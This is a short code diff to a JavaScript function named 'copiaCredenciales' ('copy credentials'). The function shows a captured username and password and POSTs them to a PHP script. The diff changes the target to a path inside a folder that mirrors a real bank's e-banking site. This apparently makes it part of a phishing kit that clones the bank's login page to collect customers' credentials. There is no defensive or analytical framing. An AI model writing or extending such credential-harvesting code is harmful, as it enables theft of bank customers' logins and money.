@@ -7,7 +7,7 @@ function copiaCredenciales(){
   alert( username );
   alert( password );
   
-  fetch('copiaCredenciales.php', {
+  fetch('/Patagonia/CopiaPHP/ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/copiaCredenciales.php', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/x-www-form-urlencoded' // o 'application/json'
